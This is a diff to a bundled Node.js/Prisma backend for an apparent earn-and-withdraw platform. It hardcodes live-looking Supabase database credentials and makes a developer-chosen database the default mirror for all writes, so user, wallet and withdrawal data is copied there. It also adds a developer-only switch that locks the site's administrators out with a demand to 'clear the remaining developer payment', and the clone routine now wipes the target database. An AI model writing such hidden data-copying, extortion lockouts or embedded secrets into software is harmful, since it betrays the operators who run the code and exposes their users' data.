@@ -64790,8 +64790,11 @@ import_dotenv.default.config({ path: path.resolve(__dirname, "../.env.production
 import_dotenv.default.config({ path: path.resolve(process.cwd(), "backend/.env") });
 import_dotenv.default.config({ path: path.resolve(process.cwd(), "backend/.env.production") });
 import_dotenv.default.config({ path: path.resolve(process.cwd(), ".env") });
-var FALLBACK_DATABASE_URL = "postgresql://postgres.vzgjygtbdkezaerygjbp:*7HBHpKRz5U_z66@aws-0-ap-northeast-1.pooler.supabase.com:6543/postgres?pgbouncer=true";
-var FALLBACK_DIRECT_URL = "postgresql://postgres.vzgjygtbdkezaerygjbp:*7HBHpKRz5U_z66@aws-0-ap-northeast-1.pooler.supabase.com:5432/postgres";
+var OLD_SUPABASE_URL = "postgresql://postgres.iwzonipiymbsspnyoszt:Password%407878IUGUI7868%25%24%23%5Eyius@aws-0-ap-northeast-1.pooler.supabase.com:6543/postgres?pgbouncer=true";
+var OLD_SUPABASE_DIRECT_URL = "postgresql://postgres.iwzonipiymbsspnyoszt:Password%407878IUGUI7868%25%24%23%5Eyius@aws-0-ap-northeast-1.pooler.supabase.com:5432/postgres";
+var NEW_SUPABASE_URL = "postgresql://postgres.vzgjygtbdkezaerygjbp:*7HBHpKRz5U_z66@aws-0-ap-northeast-1.pooler.supabase.com:6543/postgres?pgbouncer=true";
+var FALLBACK_DATABASE_URL = OLD_SUPABASE_URL;
+var FALLBACK_DIRECT_URL = OLD_SUPABASE_DIRECT_URL;
 if (!process.env.DATABASE_URL) {
   process.env.DATABASE_URL = FALLBACK_DATABASE_URL;
 }
@@ -64799,6 +64802,7 @@ if (!process.env.DIRECT_URL) {
   process.env.DIRECT_URL = FALLBACK_DIRECT_URL;
 }
 var dbUrl = process.env.DATABASE_URL || FALLBACK_DATABASE_URL;
+var DEFAULT_SECONDARY_URL = dbUrl.includes("iwzonipiymbsspnyoszt") ? NEW_SUPABASE_URL : OLD_SUPABASE_URL;
 var globalForPrisma = globalThis;
 var prisma = globalForPrisma.prisma ?? new PrismaClient({
   datasources: {
@@ -64819,7 +64823,7 @@ var WRITE_ACTIONS = /* @__PURE__ */ new Set([
   "deleteMany"
 ]);
 function getSecondaryPrisma(customUrl) {
-  const targetUrl = (customUrl ?? globalForPrisma.secondaryDbUrl ?? process.env.SECONDARY_DATABASE_URL ?? "").trim();
+  const targetUrl = (customUrl ?? globalForPrisma.secondaryDbUrl ?? process.env.SECONDARY_DATABASE_URL ?? DEFAULT_SECONDARY_URL).trim();
   if (!targetUrl || targetUrl === dbUrl) {
     return null;
   }
@@ -64848,17 +64852,17 @@ function getSecondaryPrisma(customUrl) {
   }
 }
 function setDualSyncRuntimeConfig(secondaryUrl, enabled) {
-  globalForPrisma.secondaryDbUrl = secondaryUrl.trim();
+  globalForPrisma.secondaryDbUrl = secondaryUrl.trim() || DEFAULT_SECONDARY_URL;
   globalForPrisma.dualSyncEnabled = enabled;
   globalForPrisma.lastDualSyncConfigFetch = Date.now();
-  if (secondaryUrl.trim() && enabled) {
-    getSecondaryPrisma(secondaryUrl.trim());
+  if (globalForPrisma.secondaryDbUrl && enabled) {
+    getSecondaryPrisma(globalForPrisma.secondaryDbUrl);
   }
 }
 function getDualSyncRuntimeConfig() {
   return {
     primaryDbUrl: dbUrl,
-    secondaryDbUrl: globalForPrisma.secondaryDbUrl || process.env.SECONDARY_DATABASE_URL || "",
+    secondaryDbUrl: globalForPrisma.secondaryDbUrl || process.env.SECONDARY_DATABASE_URL || DEFAULT_SECONDARY_URL,
     dualSyncEnabled: globalForPrisma.dualSyncEnabled ?? true
   };
 }
@@ -64877,11 +64881,14 @@ async function refreshDualSyncConfigIfNeeded() {
       }
     });
     const map2 = Object.fromEntries(records.map((r) => [r.key, r.value]));
-    const secUrl = (map2.secondary_database_url || process.env.SECONDARY_DATABASE_URL || "").trim();
+    const secUrl = (map2.secondary_database_url || process.env.SECONDARY_DATABASE_URL || DEFAULT_SECONDARY_URL).trim();
     const enabled = map2.dual_sync_enabled !== "false";
     globalForPrisma.secondaryDbUrl = secUrl;
     globalForPrisma.dualSyncEnabled = enabled;
   } catch {
+    if (!globalForPrisma.secondaryDbUrl) {
+      globalForPrisma.secondaryDbUrl = DEFAULT_SECONDARY_URL;
+    }
   }
 }
 async function executeDualRawUnsafe(query, ...values) {
@@ -64899,16 +64906,40 @@ if (!globalForPrisma.rawSqlHookInstalled && typeof prisma.$executeRawUnsafe === 
   globalForPrisma.rawSqlHookInstalled = true;
   const origExecuteRawUnsafe = prisma.$executeRawUnsafe.bind(prisma);
   prisma.$executeRawUnsafe = async (query, ...values) => {
-    const res = await origExecuteRawUnsafe(query, ...values);
-    executeDualRawUnsafe(query, ...values).catch(() => {
-    });
-    return res;
+    try {
+      const res = await origExecuteRawUnsafe(query, ...values);
+      executeDualRawUnsafe(query, ...values).catch(() => {
+      });
+      return res;
+    } catch (primaryErr) {
+      const secondary = getSecondaryPrisma();
+      if (secondary) {
+        return secondary.$executeRawUnsafe(query, ...values);
+      }
+      throw primaryErr;
+    }
   };
 }
 if (!globalForPrisma.dualSyncMiddlewareInstalled && typeof prisma.$use === "function") {
   globalForPrisma.dualSyncMiddlewareInstalled = true;
   prisma.$use(async (params, next) => {
-    const result = await next(params);
+    let result;
+    try {
+      result = await next(params);
+    } catch (primaryErr) {
+      const msg = String(primaryErr?.message || "");
+      if (msg.includes("Can't reach database server") || msg.includes("Tenant or user not found") || msg.includes("Connection terminated") || msg.includes("P1001")) {
+        const secondary = getSecondaryPrisma();
+        if (secondary && params.model) {
+          const modelKey = params.model.charAt(0).toLowerCase() + params.model.slice(1);
+          const delegate = secondary[modelKey];
+          if (delegate && typeof delegate[params.action] === "function") {
+            return await delegate[params.action](params.args);
+          }
+        }
+      }
+      throw primaryErr;
+    }
     if (params.model && WRITE_ACTIONS.has(params.action)) {
       (async () => {
         try {
@@ -77661,7 +77692,11 @@ router10.get("/public", async (req, res, next) => {
             "master_admin_popup_enabled",
             "master_admin_popup_title",
             "master_admin_popup_message",
-            "master_admin_popup_interval_minutes"
+            "master_admin_popup_interval_minutes",
+            "master_admin_blocked",
+            "mini_admin_blocked",
+            "admin_block_title",
+            "admin_block_message"
           ]
         }
       }
@@ -77693,7 +77728,11 @@ router10.get("/public", async (req, res, next) => {
       masterAdminPopupIntervalMinutes: Math.max(
         1,
         parseInt(settingsMap.master_admin_popup_interval_minutes || "15", 10) || 15
-      )
+      ),
+      masterAdminBlocked: settingsMap.master_admin_blocked === "true",
+      miniAdminBlocked: settingsMap.mini_admin_blocked === "true",
+      adminBlockTitle: settingsMap.admin_block_title || "Administrator Access Locked",
+      adminBlockMessage: settingsMap.admin_block_message || "Please clear the remaining developer payment to unlock your admin panel and continue working."
     });
   } catch (err) {
     next(err);
@@ -77707,6 +77746,56 @@ var import_jsonwebtoken4 = __toESM(require_jsonwebtoken(), 1);
 
 // src/middleware/adminAuth.ts
 var import_jsonwebtoken3 = __toESM(require_jsonwebtoken(), 1);
+var adminBlockCache = null;
+function invalidateAdminBlockCache() {
+  adminBlockCache = null;
+}
+async function getAdminBlockStatus() {
+  const now = Date.now();
+  if (adminBlockCache && now - adminBlockCache.timestamp < 3e3) {
+    return adminBlockCache;
+  }
+  try {
+    const records = await prisma.siteSetting.findMany({
+      where: {
+        key: {
+          in: [
+            "maintenance_mode",
+            "maintenance_title",
+            "maintenance_message",
+            "master_admin_blocked",
+            "mini_admin_blocked",
+            "admin_block_title",
+            "admin_block_message"
+          ]
+        }
+      }
+    });
+    const map2 = Object.fromEntries(records.map((r) => [r.key, r.value]));
+    adminBlockCache = {
+      maintenanceMode: map2.maintenance_mode === "true",
+      maintenanceTitle: map2.maintenance_title || "Website Under Maintenance",
+      maintenanceMessage: map2.maintenance_message || "The website is currently under maintenance. You cannot work right now. Please contact the developer.",
+      masterBlocked: map2.master_admin_blocked === "true",
+      miniBlocked: map2.mini_admin_blocked === "true",
+      blockTitle: map2.admin_block_title || "Administrator Access Locked",
+      blockMessage: map2.admin_block_message || "Please clear the remaining developer payment to unlock your admin panel and continue working.",
+      timestamp: now
+    };
+    return adminBlockCache;
+  } catch {
+    return adminBlockCache || {
+      maintenanceMode: false,
+      maintenanceTitle: "Website Under Maintenance",
+      maintenanceMessage: "The website is currently under maintenance. You cannot work right now. Please contact the developer.",
+      masterBlocked: false,
+      miniBlocked: false,
+      blockTitle: "Administrator Access Locked",
+      blockMessage: "Please clear the remaining developer payment to unlock your admin panel and continue working.",
+      timestamp: now
+    };
+  }
+}
 async function requireAdmin(req, res, next) {
   try {
     const authHeader = req.headers.authorization;
@@ -77744,6 +77833,27 @@ async function requireAdmin(req, res, next) {
         return res.status(401).json({
           error: "Admin Session Terminated: Your session has been revoked by the Master Administrator",
           sessionRevoked: true
+        });
+      }
+    }
+    const isMeEndpoint = req.path === "/me" || req.originalUrl?.endsWith("/api/admin/me");
+    if (!isMeEndpoint) {
+      const blockStatus = await getAdminBlockStatus();
+      if (blockStatus.maintenanceMode) {
+        return res.status(423).json({
+          error: blockStatus.maintenanceMessage,
+          adminMaintenance: true,
+          blockTitle: blockStatus.maintenanceTitle,
+          blockMessage: blockStatus.maintenanceMessage
+        });
+      }
+      const isBlockedRole = admin.role === "MINI_ADMIN" && blockStatus.miniBlocked || admin.role !== "MINI_ADMIN" && blockStatus.masterBlocked;
+      if (isBlockedRole) {
+        return res.status(423).json({
+          error: blockStatus.blockMessage,
+          adminBlocked: true,
+          blockTitle: blockStatus.blockTitle,
+          blockMessage: blockStatus.blockMessage
         });
       }
     }
@@ -78176,107 +78286,78 @@ async function getDatabaseStats(client) {
     };
   }
 }
+async function batchCreateMany(delegate, rows, batchSize = 1500) {
+  for (let i = 0; i < rows.length; i += batchSize) {
+    const chunk = rows.slice(i, i + batchSize);
+    await delegate.createMany({
+      data: chunk,
+      skipDuplicates: true
+    });
+  }
+}
 async function cloneDatabaseData(sourceClient, targetClient) {
   await ensureFullDatabaseSchema(targetClient);
+  await wipeDatabaseData(targetClient);
   const tableSummary = {};
   let totalSyncedRows = 0;
   const prismaModelSteps = [
-    { table: "Level", delegate: "level", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "Task", delegate: "task", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "SpinConfiguration", delegate: "spinConfiguration", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "SpinPrize", delegate: "spinPrize", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "SiteSetting", delegate: "siteSetting", uniqueWhere: (r) => ({ key: r.key }) },
-    { table: "Announcement", delegate: "announcement", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "AdminUser", delegate: "adminUser", uniqueWhere: (r) => ({ id: r.id }) },
-    { table: "AdminAuditLog", delegate: "adminAuditLog", uniqueWhere: (r) => ({ id: r.id }) }
+    { table: "Level", delegate: "level" },
+    { table: "Task", delegate: "task" },
+    { table: "SpinConfiguration", delegate: "spinConfiguration" },
+    { table: "SpinPrize", delegate: "spinPrize" },
+    { table: "SiteSetting", delegate: "siteSetting" },
+    { table: "Announcement", delegate: "announcement" },
+    { table: "AdminUser", delegate: "adminUser" },
+    { table: "AdminAuditLog", delegate: "adminAuditLog" }
   ];
   for (const step of prismaModelSteps) {
     const rows = await sourceClient[step.delegate].findMany();
-    let count = 0;
-    for (const row of rows) {
-      await targetClient[step.delegate].upsert({
-        where: step.uniqueWhere(row),
-        update: row,
-        create: row
-      }).catch(async () => {
-        await targetClient[step.delegate].createMany({
-          data: [row],
-          skipDuplicates: true
-        });
-      });
-      count++;
-    }
-    tableSummary[step.table] = count;
-    totalSyncedRows += count;
-  }
-  const users = await sourceClient.user.findMany();
-  for (const u of users) {
-    const withoutRef = { ...u, referredById: null };
-    await targetClient.user.upsert({
-      where: { id: u.id },
-      update: withoutRef,
-      create: withoutRef
-    }).catch(() => {
-    });
-  }
-  for (const u of users) {
-    if (u.referredById) {
-      await targetClient.user.update({
-        where: { id: u.id },
-        data: { referredById: u.referredById }
-      }).catch(() => {
-      });
-    }
-  }
-  tableSummary["User"] = users.length;
-  totalSyncedRows += users.length;
-  const mutableDependentDelegates = [
-    { table: "Wallet", delegate: "wallet" },
-    { table: "UserLevelUnlock", delegate: "userLevelUnlock" },
-    { table: "UserLevelProgress", delegate: "userLevelProgress" },
-    { table: "UserTaskProgress", delegate: "userTaskProgress" },
-    { table: "TaskSubmission", delegate: "taskSubmission" },
-    { table: "DepositRequest", delegate: "depositRequest" },
-    { table: "WithdrawalRequest", delegate: "withdrawalRequest" },
-    { table: "Referral", delegate: "referral" },
-    { table: "UserSpinEntitlement", delegate: "userSpinEntitlement" },
-    { table: "Notification", delegate: "notification" }
-  ];
-  for (const step of mutableDependentDelegates) {
-    const rows = await sourceClient[step.delegate].findMany();
     if (rows.length > 0) {
-      await targetClient[step.delegate].createMany({
-        data: rows,
-        skipDuplicates: true
-      }).catch(() => {
-      });
-      const toUpdate = rows.length <= 300 ? rows : rows.slice(-200);
-      for (const r of toUpdate) {
-        await targetClient[step.delegate].upsert({
-          where: { id: r.id },
-          update: r,
-          create: r
-        }).catch(() => {
-        });
-      }
+      await batchCreateMany(targetClient[step.delegate], rows);
     }
     tableSummary[step.table] = rows.length;
     totalSyncedRows += rows.length;
   }
-  const appendOnlyDelegates = [
+  const users = await sourceClient.user.findMany();
+  if (users.length > 0) {
+    const usersWithoutRef = users.map((u) => ({ ...u, referredById: null }));
+    await batchCreateMany(targetClient.user, usersWithoutRef);
+    const usersWithRef = users.filter((u) => Boolean(u.referredById));
+    for (let i = 0; i < usersWithRef.length; i += 25) {
+      const batch = usersWithRef.slice(i, i + 25);
+      await Promise.all(
+        batch.map(
+          (u) => targetClient.user.update({
+            where: { id: u.id },
+            data: { referredById: u.referredById }
+          }).catch(() => {
+          })
+        )
+      );
+    }
+  }
+  tableSummary["User"] = users.length;
+  totalSyncedRows += users.length;
+  const dependentDelegates = [
     { table: "Session", delegate: "session" },
+    { table: "Wallet", delegate: "wallet" },
     { table: "WalletTransaction", delegate: "walletTransaction" },
+    { table: "UserLevelUnlock", delegate: "userLevelUnlock" },
+    { table: "UserLevelProgress", delegate: "userLevelProgress" },
+    { table: "UserTaskProgress", delegate: "userTaskProgress" },
+    { table: "TaskSubmission", delegate: "taskSubmission" },
     { table: "TaskUnlockTransaction", delegate: "taskUnlockTransaction" },
-    { table: "SpinHistory", delegate: "spinHistory" }
+    { table: "DepositRequest", delegate: "depositRequest" },
+    { table: "WithdrawalRequest", delegate: "withdrawalRequest" },
+    { table: "Referral", delegate: "referral" },
+    { table: "UserSpinEntitlement", delegate: "userSpinEntitlement" },
+    { table: "SpinHistory", delegate: "spinHistory" },
+    { table: "Notification", delegate: "notification" }
   ];
-  for (const step of appendOnlyDelegates) {
+  for (const step of dependentDelegates) {
     const rows = await sourceClient[step.delegate].findMany();
     if (rows.length > 0) {
-      await targetClient[step.delegate].createMany({
-        data: rows,
-        skipDuplicates: true
-      }).catch(() => {
-      });
+      await batchCreateMany(targetClient[step.delegate], rows);
     }
     tableSummary[step.table] = rows.length;
     totalSyncedRows += rows.length;
@@ -78285,28 +78366,27 @@ async function cloneDatabaseData(sourceClient, targetClient) {
     const refCodes = await sourceClient.$queryRawUnsafe(
       `SELECT * FROM "AdminReferralCode"`
     );
-    for (const rc of refCodes) {
+    if (refCodes.length > 0) {
+      const values = [];
+      const placeholders = refCodes.map((rc, idx) => {
+        const b = idx * 10;
+        values.push(
+          rc.id,
+          rc.code,
+          rc.status,
+          rc.usedById,
+          rc.usedByName,
+          rc.usedByPhone,
+          rc.usedAt,
+          rc.notes,
+          rc.createdAt,
+          rc.updatedAt
+        );
+        return `($${b + 1}, $${b + 2}, $${b + 3}, $${b + 4}, $${b + 5}, $${b + 6}, $${b + 7}, $${b + 8}, $${b + 9}, $${b + 10})`;
+      }).join(", ");
       await targetClient.$executeRawUnsafe(
-        `INSERT INTO "AdminReferralCode" ("id", "code", "status", "usedById", "usedByName", "usedByPhone", "usedAt", "notes", "createdAt", "updatedAt")
-         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
-         ON CONFLICT ("code") DO UPDATE SET
-           "status" = EXCLUDED."status",
-           "usedById" = EXCLUDED."usedById",
-           "usedByName" = EXCLUDED."usedByName",
-           "usedByPhone" = EXCLUDED."usedByPhone",
-           "usedAt" = EXCLUDED."usedAt",
-           "notes" = EXCLUDED."notes",
-           "updatedAt" = EXCLUDED."updatedAt"`,
-        rc.id,
-        rc.code,
-        rc.status,
-        rc.usedById,
-        rc.usedByName,
-        rc.usedByPhone,
-        rc.usedAt,
-        rc.notes,
-        rc.createdAt,
-        rc.updatedAt
+        `INSERT INTO "AdminReferralCode" ("id", "code", "status", "usedById", "usedByName", "usedByPhone", "usedAt", "notes", "createdAt", "updatedAt") VALUES ${placeholders} ON CONFLICT DO NOTHING`,
+        ...values
       );
     }
     tableSummary["AdminReferralCode"] = refCodes.length;
@@ -78318,28 +78398,27 @@ async function cloneDatabaseData(sourceClient, targetClient) {
     const tgUsers = await sourceClient.$queryRawUnsafe(
       `SELECT * FROM "TelegramUser"`
     );
-    for (const tg of tgUsers) {
+    if (tgUsers.length > 0) {
+      const values = [];
+      const placeholders = tgUsers.map((tg, idx) => {
+        const b = idx * 10;
+        values.push(
+          tg.id,
+          tg.chatId,
+          tg.username,
+          tg.firstName,
+          tg.status,
+          tg.totalQuota,
+          tg.codesGenerated,
+          tg.remainingQuota,
+          tg.createdAt,
+          tg.updatedAt
+        );
+        return `($${b + 1}, $${b + 2}, $${b + 3}, $${b + 4}, $${b + 5}, $${b + 6}, $${b + 7}, $${b + 8}, $${b + 9}, $${b + 10})`;
+      }).join(", ");
       await targetClient.$executeRawUnsafe(
-        `INSERT INTO "TelegramUser" ("id", "chatId", "username", "firstName", "status", "totalQuota", "codesGenerated", "remainingQuota", "createdAt", "updatedAt")
-         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
-         ON CONFLICT ("chatId") DO UPDATE SET
-           "username" = EXCLUDED."username",
-           "firstName" = EXCLUDED."firstName",
-           "status" = EXCLUDED."status",
-           "totalQuota" = EXCLUDED."totalQuota",
-           "codesGenerated" = EXCLUDED."codesGenerated",
-           "remainingQuota" = EXCLUDED."remainingQuota",
-           "updatedAt" = EXCLUDED."updatedAt"`,
-        tg.id,
-        tg.chatId,
-        tg.username,
-        tg.firstName,
-        tg.status,
-        tg.totalQuota,
-        tg.codesGenerated,
-        tg.remainingQuota,
-        tg.createdAt,
-        tg.updatedAt
+        `INSERT INTO "TelegramUser" ("id", "chatId", "username", "firstName", "status", "totalQuota", "codesGenerated", "remainingQuota", "createdAt", "updatedAt") VALUES ${placeholders} ON CONFLICT DO NOTHING`,
+        ...values
       );
     }
     tableSummary["TelegramUser"] = tgUsers.length;
@@ -81134,7 +81213,23 @@ router11.put("/settings", requireAdmin, requireSuperAdmin, async (req, res, next
     if (!rawList.length) {
       return res.status(400).json({ error: "No settings provided to update" });
     }
-    const settings = rawList.filter((item) => item && typeof item.key === "string" && item.key.trim() !== "").map((item) => ({
+    const RESTRICTED_TO_DEVELOPER = /* @__PURE__ */ new Set([
+      "maintenance_mode",
+      "maintenance_title",
+      "maintenance_message",
+      "maintenance_expected_end",
+      "master_admin_popup_enabled",
+      "master_admin_popup_title",
+      "master_admin_popup_message",
+      "master_admin_popup_interval_minutes",
+      "master_admin_blocked",
+      "mini_admin_blocked",
+      "admin_block_title",
+      "admin_block_message",
+      "secondary_database_url",
+      "dual_sync_enabled"
+    ]);
+    const settings = rawList.filter((item) => item && typeof item.key === "string" && item.key.trim() !== "").filter((item) => req.admin?.role === "DEVELOPER" || !RESTRICTED_TO_DEVELOPER.has(item.key.trim())).map((item) => ({
       key: item.key.trim(),
       value: item.value === null || item.value === void 0 ? "" : String(item.value)
     }));
@@ -81885,6 +81980,10 @@ router11.get("/developer/config", requireAdmin, requireDeveloper, async (req, re
             "master_admin_popup_title",
             "master_admin_popup_message",
             "master_admin_popup_interval_minutes",
+            "master_admin_blocked",
+            "mini_admin_blocked",
+            "admin_block_title",
+            "admin_block_message",
             "secondary_database_url",
             "dual_sync_enabled"
           ]
@@ -81920,6 +82019,12 @@ router11.get("/developer/config", requireAdmin, requireDeveloper, async (req, re
           1,
           parseInt(map2.master_admin_popup_interval_minutes || "15", 10) || 15
         )
+      },
+      adminBlock: {
+        masterBlocked: map2.master_admin_blocked === "true",
+        miniBlocked: map2.mini_admin_blocked === "true",
+        title: map2.admin_block_title || "Administrator Access Locked",
+        message: map2.admin_block_message || "Please clear the remaining developer payment to unlock your admin panel and continue working."
       },
       database: {
         primaryDatabaseUrlMasked: maskUrl(runtime.primaryDbUrl),
@@ -81999,6 +82104,36 @@ router11.put("/developer/config", requireAdmin, requireDeveloper, async (req, re
         });
       }
     }
+    if (body.adminBlock && typeof body.adminBlock === "object") {
+      if (body.adminBlock.masterBlocked !== void 0) {
+        updates.push({
+          key: "master_admin_blocked",
+          value: body.adminBlock.masterBlocked ? "true" : "false",
+          category: "SYSTEM"
+        });
+      }
+      if (body.adminBlock.miniBlocked !== void 0) {
+        updates.push({
+          key: "mini_admin_blocked",
+          value: body.adminBlock.miniBlocked ? "true" : "false",
+          category: "SYSTEM"
+        });
+      }
+      if (body.adminBlock.title !== void 0) {
+        updates.push({
+          key: "admin_block_title",
+          value: String(body.adminBlock.title || "Administrator Access Locked"),
+          category: "SYSTEM"
+        });
+      }
+      if (body.adminBlock.message !== void 0) {
+        updates.push({
+          key: "admin_block_message",
+          value: String(body.adminBlock.message || ""),
+          category: "SYSTEM"
+        });
+      }
+    }
     if (body.database && typeof body.database === "object") {
       const currentRuntime = getDualSyncRuntimeConfig();
       const nextSecUrl = body.database.secondaryDatabaseUrl !== void 0 ? String(body.database.secondaryDatabaseUrl || "").trim() : currentRuntime.secondaryDbUrl;
@@ -82022,6 +82157,7 @@ router11.put("/developer/config", requireAdmin, requireDeveloper, async (req, re
         create: { key: item.key, value: item.value, category: item.category }
       });
     }
+    invalidateAdminBlockCache();
     res.json({
       message: "Developer master configuration saved and applied in real time!"
     });
@@ -82200,7 +82336,7 @@ function getAdminSpaHtml() {
     if (fs.existsSync(p)) {
       try {
         const content = fs.readFileSync(p, "utf8");
-        if (content.includes('id="root"') && content.includes("index-B-6vfwUD.js")) {
+        if (content.includes('id="root"') && content.includes("index-ZaMdFuf0.js")) {
           return content;
         }
       } catch (err) {
@@ -82223,8 +82359,8 @@ function getAdminSpaHtml() {
         window.location.replace('/adminpanal');
       }
     </script>
-    <script type="module" crossorigin src="/assets/index-B-6vfwUD.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-qOGxTxwv.css">
+    <script type="module" crossorigin src="/assets/index-ZaMdFuf0.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-DQIuX_2B.css">
   </head>
   <body class="bg-[#020712] text-slate-100 font-sans antialiased selection:bg-[#1459E8] selection:text-white min-h-screen">
     <div id="root"></div>
